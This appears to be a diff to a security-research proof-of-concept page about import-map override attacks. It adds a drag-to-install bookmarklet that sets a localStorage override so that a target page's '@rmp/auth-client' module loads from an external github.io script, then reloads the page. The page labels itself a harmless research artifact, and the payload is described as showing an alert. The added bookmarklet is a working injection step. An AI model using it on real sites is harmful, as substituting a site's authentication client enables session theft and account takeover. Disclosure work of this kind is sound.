@@ -54,6 +54,18 @@
 <body>
     <h1>🧪 Import Map Override — Proof of Concept</h1>
 
+    <div class="alert-box" style="border-color: #e94560;">
+        <strong>🔥 One-Click Bookmarklet</strong>
+        <p>Drag this link to your bookmarks bar, then click it while on the target page:</p>
+        <p style="font-size:1.2em; text-align:center; margin:12px 0;">
+            <a href="javascript:localStorage.setItem('import-map-override:@rmp/auth-client','https://xqur.github.io/import-map-proof-poc/proof.js');location.reload();"
+               style="background:#e94560; color:white; padding:12px 24px; border-radius:8px; text-decoration:none; font-weight:bold; display:inline-block;">
+                📌 Override @rmp/auth-client
+            </a>
+        </p>
+        <p><strong>Usage:</strong> Open target page → Click bookmark → Page reloads → Alert + Console log appear ✅</p>
+    </div>
+
     <div class="alert-box">
         <strong>⚠️ Security Research Artifact Only</strong>
         <p>This repository and its contents are intended <em>solely</em> as a harmless proof-of-concept
